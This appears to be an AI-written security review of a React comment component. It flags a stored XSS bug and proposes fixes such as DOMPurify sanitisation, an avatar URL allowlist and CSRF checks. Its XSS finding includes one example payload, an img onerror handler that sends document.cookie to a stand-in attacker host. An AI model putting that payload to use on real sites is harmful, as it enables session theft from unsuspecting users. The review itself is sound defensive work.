## Security Assessment: `CommentSection.tsx` — **FAIL** 🚨

This component has a **critical blocker** and must not be merged as-is.

---

### [CRITICAL – P0] Stored XSS via `dangerouslySetInnerHTML` (Line 77–79)

**CVSS 9.3** — This is the blocker.

```tsx
// ❌ DANGEROUS — executes arbitrary HTML from the server
<div dangerouslySetInnerHTML={{ __html: comment.content }} />
```

User-submitted comment content is rendered as raw HTML, bypassing all of React's output encoding. An attacker posts `<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">` and it executes in every viewer's browser.

**Fix — if plain text is sufficient (recommended):**
```tsx
// ✅ React encodes output by default
<div className="comment-body">{comment.content}</div>
```

**Fix — if rich text is genuinely required:**
```tsx
import DOMPurify from 'dompurify';
const ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'a', 'br', 'p'];
const ALLOWED_ATTR = ['href', 'rel'];

<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(comment.content, { ALLOWED_TAGS, ALLOWED_ATTR })
}} />
```

---

### [HIGH – P1] No Authentication Gate on Comment Form (Lines 58–63)

The form renders unconditionally for unauthenticated visitors. Wrap it with Clerk's `useUser()`:

```tsx
const { isSignedIn } = useUser();
// ...
{isSignedIn ? <form>...</form> : <p>Sign in to comment</p>}
```

---

### [HIGH – P1] Unvalidated External URL in `<img src>` (Line 72)

`comment.avatarUrl` is rendered verbatim, allowing arbitrary image loads from attacker-controlled origins (IP exfiltration, tracking, internal SSRF via proxies).

```tsx
// ✅ Validate against an allowlist of trusted avatar domains
function isTrustedAvatarUrl(url: string): boolean {
  try {
    const { protocol, hostname } = new URL(url);
    return protocol === 'https:' && ['img.clerk.com', 'gravatar.com'].includes(hostname);
  } catch { return false; }
}

<img src={isTrustedAvatarUrl(comment.avatarUrl) ? comment.avatarUrl : '/default-avatar.png'} />
```

Better: route all avatars through Next.js `<Image>` with a configured `remotePatterns` allowlist.

---

### [HIGH – P1] No CSRF Protection on POST (Lines 43–48)

Add `credentials: 'same-origin'` and verify `Origin`/`Referer` server-side. Ensure session cookies carry `SameSite=Strict`.

---

### [MEDIUM – P2] No Input Length Validation (Lines 59–62)

```tsx
const MAX = 2000;
<textarea maxLength={MAX} onChange={(e) => setNewComment(e.target.value.slice(0, MAX))} />
```

Mirror this limit server-side with a 422 response.

---

### [MEDIUM – P2] Silent Error Handling Hides Failures (Lines 32–33, 52–53)

Swallowed errors mean failed POSTs appear to succeed and API failures (401, 403) go unnoticed. Add an `error` state and surface a generic message to users; log the full technical error separately.

---

### [LOW – P3] `postId` Not URL-Encoded (Lines 27, 43)

```tsx
fetch(`/api/posts/${encodeURIComponent(postId)}/comments`)
```

---

### Summary

| Severity | Finding | Line(s) |
|---|---|---|
| **CRITICAL** | Stored XSS via `dangerouslySetInnerHTML` | 77–79 |
| HIGH | No auth gate on comment form | 58–63 |
| HIGH | Unvalidated `avatarUrl` in `<img src>` | 72 |
| HIGH | No CSRF protection on POST | 43–48 |
| MEDIUM | No input length validation | 59–62 |
| MEDIUM | Silent error handling | 32–33, 52–53 |
| LOW | `postId` not URL-encoded | 27, 43 |

**Do not merge.** The `dangerouslySetInnerHTML` XSS is a drop-everything fix — replacing it with plain JSX text rendering is a one-line change that eliminates the critical vulnerability entirely. Resolve the three HIGH findings before re-review.
